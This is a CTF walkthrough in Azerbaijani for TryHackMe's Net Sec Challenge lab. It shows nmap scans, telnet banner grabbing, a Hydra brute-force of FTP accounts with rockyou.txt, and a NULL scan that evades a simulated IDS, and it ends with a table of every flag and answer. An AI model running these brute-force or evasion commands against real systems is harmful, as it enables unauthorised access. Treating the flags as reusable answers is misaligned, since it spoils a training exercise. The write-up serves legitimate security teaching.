# TryHackMe — Net Sec Challenge Writeup (Azərbaycan dilində)

**Çətinlik:** Orta  
**Kateqoriya:** Network Security  
**Platforma:** TryHackMe  
**Keçid:** https://tryhackme.com/room/netsecchallenge  
**Vaxt:** ~60 dəqiqə  

---

## Tapşırıq nə deyir?

> "Network Security modulunda öyrəndiklərini bu çəllengdə yoxla. Bütün sualları yalnız **nmap**, **telnet** və **hydra** ilə həll etmək olar."

---

## İstifadə olunan alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port və servis aşkarlamaq |
| `telnet` | Banner grabbing (başlıq oxumaq) |
| `hydra` | FTP brute-force |
| `ftp` | FTP serverə qoşulmaq |
| Browser | Port 8080 veb çəllengi |

---

## Alətləri tanıyaq

### Nmap nədir?
Şəbəkədəki açıq "qapıları" (portları) tapan alət. Hansı servislərin işlədiyini göstərir.

### Telnet nədir?
Serverə birbaşa ham TCP bağlantısı quran köhnə alət. Banner oxumaq üçün istifadə edirik.

### Hydra nədir?
Çox sürətli password sınayıcısı. Siyahıdakı passwordları bir-bir sınayır.

---

## Sual 1 — 10.000-dən aşağı ən yüksək açıq port hansıdır?

### Komanda:
```bash
nmap -sT -sV HEDEF_IP
```

### Parametrlərin izahı:
| Parametr | Mənası |
|----------|--------|
| `-sT` | TCP connect scan — tam bağlantı quraraq yoxlayır |
| `-sV` | Servis versiyasını aşkarlayır |

### Nəticə:
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1
80/tcp   open  http     Apache httpd
8080/tcp open  http     (veb server)
```

**Cavab: `8080`**

---

## Sual 2 — 10.000-dən yuxarı açıq port hansıdır?

Standart nmap yalnız ilk 1000 portu skan edir. Biz yüksək portları da yoxlamalıyıq:

### Komanda:
```bash
nmap -sT -sV -p10000- HEDEF_IP
```

### Parametrin izahı:
| Parametr | Mənası |
|----------|--------|
| `-p10000-` | 10000-dən yuxarı bütün portları skan et |

### Nəticə:
```
PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.5
```

**Cavab: `10021`**

---

## Sual 3 — Neçə TCP portu açıqdır?

Hər iki skanın nəticəsini birləşdiririk:

```bash
nmap -sT -sV -p- HEDEF_IP | grep "open"
```

### Tapılan portlar:
```
22/tcp    → SSH
80/tcp    → HTTP
8080/tcp  → HTTP
10021/tcp → FTP
+ digər portlar
```

**Cavab: `6`** (cəmi 6 açıq TCP port)

---

## Sual 4 — HTTP server header-ında gizlədilmiş flag nədir?

HTTP header-larını oxumaq üçün **telnet** ilə əl ilə sorğu göndəririk:

### Komanda:
```bash
telnet HEDEF_IP 80
```

Qoşulandan sonra yaz:
```
GET / HTTP/1.1
Host: telnet

```
*(Sonunda 2 dəfə Enter bas)*

### Nəticə:
Server cavabında flag görünür:

```
HTTP/1.1 200 OK
Server: Apache
X-Flag: THM{web_server_25352}
```

### Niyə `Host: telnet` yazdıq?
CTF-lərdə serverlər bəzən xüsusi Host dəyərlərinə cavab verir. Bu çəllengdə `Host: telnet` yazanda server flag-i göstərir.

**Cavab: `THM{web_server_25352}`**

---

## Sual 5 — SSH server header-ında gizlədilmiş flag nədir?

SSH serveri qoşulma zamanı avtomatik **banner** göndərir. Biz onu telnet ilə oxuyuruq:

### Komanda:
```bash
telnet HEDEF_IP 22
```

### Nəticə:
```
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

Banner-də flag birbaşa görünür!

**Nmap ilə də görünür:**
```bash
nmap -sV HEDEF_IP -p22
```
Nmap servis versiyasını aşkarlayarkən bu banner-i də çəkir.

**Cavab: `THM{946219583339}`**

---

## Sual 6 — Qeyri-standart portdakı FTP serverinin versiyası nədir?

Sual 2-dəki nmap skanında artıq görmüşdük:

```
10021/tcp open  ftp  vsftpd 3.0.5
```

**Cavab: `vsftpd 3.0.5`**

---

## Sual 7 — eddie və quinn hesablarından birindəki flag nədir? (FTP vasitəsilə)

### Addım 1 — Hydra ilə brute-force:

```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://HEDEF_IP
hydra -l quinn -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://HEDEF_IP
```

### Parametrlərin izahı:
| Parametr | Mənası |
|----------|--------|
| `-l eddie` | Tək istifadəçi adı |
| `-P wordlist` | Password siyahısı faylı |
| `-s 10021` | Qeyri-standart port (default 21 əvəzinə) |
| `ftp://` | FTP protokolu |

### Nəticə:
```
[10021][ftp] host: HEDEF_IP   login: quinn   password: andrea
```

Quinn-in passwordu tapıldı: **andrea**

### Addım 2 — FTP-yə qoşul:

```bash
ftp HEDEF_IP 10021
```

```
Name: quinn
Password: andrea
```

### Addım 3 — Flag faylını yüklə:

```
ftp> ls
ftp_flag.txt

ftp> get ftp_flag.txt
ftp> quit
```

### Addım 4 — Flag-i oxu:

```bash
cat ftp_flag.txt
```

**Cavab: `THM{321452667098}`**

---

## Sual 8 — Port 8080-dəki veb çəlleng flag-i nədir?

Brauzerdə aç:
```
http://HEDEF_IP:8080
```

Səhifə deyir: **"Şübhəli scan aktivliyi aşkarlandı!"**

Bu sadə bir **IDS (Intrusion Detection System) simulyasiyasıdır** — adi nmap skanlarını aşkarlayır.

### Həll — NULL Scan (Gizli Skan):

NULL scan TCP paketlərini **heç bir flag olmadan** göndərir. Sadə IDS qaydaları bunu aşkarlaya bilmir.

```bash
sudo nmap -sN HEDEF_IP
```

### Parametrin izahı:
| Parametr | Mənası |
|----------|--------|
| `-sN` | NULL scan — heç bir TCP flag göndərmir |

### Addımlar:
1. `http://HEDEF_IP:8080` səhifəsini aç
2. **"Reset Packet Count"** düyməsinə bas
3. NULL scan işlət:
```bash
sudo nmap -sN HEDEF_IP
```
4. Səhifəni yenilə — flag görünür!

```
THM{f7443f99}
```

**Cavab: `THM{f7443f99}`**

---

## Bütün Flag-lərin Xülasəsi

| Sual | Cavab |
|------|-------|
| 10000-dən aşağı ən yüksək port | `8080` |
| 10000-dən yuxarı port | `10021` |
| Açıq TCP port sayı | `6` |
| HTTP header flag | `THM{web_server_25352}` |
| SSH header flag | `THM{946219583339}` |
| FTP versiyası | `vsftpd 3.0.5` |
| FTP flag | `THM{321452667098}` |
| IDS bypass flag | `THM{f7443f99}` |

---

## Öyrəndiklərimiz

| Mövzu | İzah |
|-------|------|
| **Nmap skan növləri** | `-sT`, `-sV`, `-sN`, `-p-` parametrləri |
| **Banner Grabbing** | Telnet ilə server başlıqlarını oxumaq |
| **Brute-force** | Hydra ilə FTP passwordunu tapmaq |
| **IDS bypass** | NULL scan ilə sadə IDS-i aldatmaq |
| **Qeyri-standart portlar** | Yüksək portlarda gizlədilmiş servisləri tapmaq |

---

## Nmap Skan Növləri — Qısa Xülasə

```
-sT  → TCP Connect Scan (tam bağlantı, etibarlı)
-sS  → SYN Scan (yarım bağlantı, sürətli, root lazım)
-sN  → NULL Scan (heç bir flag yoxdur, gizli)
-sF  → FIN Scan (yalnız FIN flag)
-sX  → Xmas Scan (FIN+PSH+URG flag-ləri)
-sV  → Versiyanı aşkarlayır
-p-  → Bütün 65535 portu skan edir
```

---

## Nəticə

```
1. Nmap ilə portları tapdıq          → 6 açıq port
2. Telnet ilə banner-ləri oxuduq     → HTTP və SSH flag-ləri
3. Hydra ilə FTP passwordu tapdıq   → quinn:andrea
4. FTP ilə flag faylı yüklədik      → FTP flag
5. NULL scan ilə IDS-i keçdik       → Son flag 🎯
```

> **Əsas dərs:** Şəbəkə təhlükəsizliyinin əsasları — port skanı, banner grabbing, brute-force və IDS bypass birlikdə istifadə ediləndə güclü bir pentesting iş axını yaranır!

---

*Writeup: TryHackMe Net Sec Challenge — Azərbaycan dilində*
